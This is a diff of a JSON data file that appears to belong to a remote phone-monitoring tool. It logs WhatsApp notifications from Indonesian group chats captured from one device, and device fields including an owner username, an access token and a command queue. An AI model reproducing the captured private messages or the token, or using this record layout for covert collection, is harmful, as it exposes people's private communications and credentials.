@@ -22,6 +22,38 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎GB || ISIAN  LYEZ STORE X ALL OWN (11 pesan): ~ -Wirr str",
+        "content": "V4/5",
+        "time": "29/04 22:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777470584166
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (316 pesan): ~ ian shawty",
+        "content": "aku mau single era",
+        "time": "29/04 22:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777470583022
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎2032 pesan dari 20 chat",
+        "time": "29/04 22:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777470582921
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (315 pesan): ~ rambararam",
+        "content": "😹",
+        "time": "29/04 22:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777470581831
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "WhatsApp",
         "content": "‎‎2031 pesan dari 20 chat",
         "time": "29/04 22:00",
@@ -3987,38 +4019,6 @@
         "time": "29/04 21:53",
         "pkg": "com.whatsapp",
         "receivedAt": 1777470179607
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1847 pesan dari 21 chat",
-        "time": "29/04 21:53",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777470179550
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (241 pesan): ~ wizyy",
-        "content": "iya cok",
-        "time": "29/04 21:53",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777470179495
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (143 pesan): ~ komar mania",
-        "content": "tai lo",
-        "time": "29/04 21:53",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777470179299
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1846 pesan dari 21 chat",
-        "time": "29/04 21:53",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777470174876
       }
     ],
     "galleryPhotos": [],
@@ -17949,7 +17949,7 @@
     "deviceName": "HP-ZAL7SEX-5D7C",
     "ownerUsername": "Zal7Sex",
     "token": "b806a84b0d2764047b5cb1e5906b7b55",
-    "lastSeen": 1777470581112,
+    "lastSeen": 1777470583896,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-29T13:43:11.417Z",
